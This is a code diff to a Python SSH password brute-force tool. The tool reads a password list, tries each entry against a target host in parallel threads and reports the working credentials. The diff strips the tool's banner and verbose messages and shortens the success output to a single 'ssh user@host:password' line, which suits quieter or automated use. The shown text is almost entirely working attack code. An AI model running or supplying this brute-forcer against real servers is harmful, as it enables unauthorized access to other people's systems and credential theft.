@@ -38,26 +38,12 @@ def clearConsole():
         command = 'cls'
     os.system(command)
 
-def showBanner():
-	print(f'''{red}
-                 d8b       d8b                                       
-                 ?88       ?88                           d8P         
-                  88b       88b                       d888888P       
- .d888b, .d888b,  888888b   888888b   88bd88b?88   d8P  ?88'   d8888b
- ?8b,    ?8b,     88P `?8b  88P `?8b  88P'  `d88   88   88P   d8b_,dP
-   `?8b    `?8b  d88   88P d88,  d88 d88     ?8(  d88   88b   88b    
-`?888P' `?888P' d88'   88bd88'`?88P'd88'     `?88P'?8b  `?8b  `?888P'
-
--- Developer: @thexcoderz -------------------------------------------''')
-	print(f'''{green}
----------------------------------------------------------------------
-	''')
 
 def ssh_connect(password):
 	ssh = redssh.RedSSH(ssh_host_key_verification=redssh.enums.SSHHostKeyVerify.auto_add)
 	try:
 		ssh.connect(hostname, port=port, username=user, password=password)
-		print(f"{green}Correct Password{reset_color} : {password}")
+		# print(f"{green}Correct Password{reset_color} : {password}")
 		ssh.exit()
 		global pass_found, correct_password
 		correct_password = password
@@ -80,20 +66,17 @@ def ssh_connect(password):
 					print(f"{red}Wrong Password - {password} ")
 
 def correct_pass_found():
-	clearConsole()
-	showBanner()
-	print(f"{blue}[+]{reset_color} Password Found\n")
-	print(f"{blue}[+]{reset_color} {green}Server:{reset_color} ssh://{hostname}:{port}")
-	print(f"{blue}[+]{reset_color} {green}User:{reset_color} {user}")
-	print(f"{blue}[+]{reset_color} {green}Password:{reset_color} {correct_password}")
+	# print(f"{blue}[+]{reset_color} Password Found")
+	# print(f"{blue}[+]{reset_color} {green}Server:{reset_color} ssh://{hostname}:{port}")
+	# print(f"{blue}[+]{reset_color} {green}User:{reset_color} {user}")
+	# print(f"{blue}[+]{reset_color} {green}Password:{reset_color} {correct_password}")
+	print(f"ssh {user}@{hostname}:{correct_password}")
 
 if __name__=="__main__":
-	clearConsole()
-	showBanner()
 	try:
 		with open(pass_file) as f:
 			pass_list = f.read().split("\n")
-			print(f"{blue}[+]{reset_color} {green}Starting bruteforce attact on ssh://{hostname}:{port} for user: {user}\n")
+			# print(f"{blue}[+]{reset_color} {green}Starting bruteforce attact on ssh://{hostname}:{port} for user: {user}\n")
 			for password in pass_list:
 				if not pass_found and not host_down:
 					t = Thread(target=ssh_connect, args=(password,))
